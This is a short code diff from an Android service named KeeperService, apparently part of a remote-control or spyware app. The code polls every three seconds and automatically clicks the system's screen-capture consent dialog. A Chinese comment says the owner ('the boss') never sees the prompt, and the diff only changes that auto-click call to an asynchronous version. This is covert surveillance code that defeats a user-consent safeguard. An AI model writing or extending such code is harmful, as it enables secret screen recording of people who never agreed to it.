@@ -43,7 +43,7 @@ public class KeeperService extends Service {
             // 某些 ROM 不派发窗口变化事件），这里 3 秒一轮补点，老板全程看不到这个框。
             try {
                 if (ScreenCapture.awaitingConsent()) {
-                    Consent.clickIfNeeded(Remote.service());
+                    Consent.clickIfNeededAsync(Remote.service());
                 }
             } catch (Throwable t) {
                 Log.w(TAG, "consent autopick failed", t);
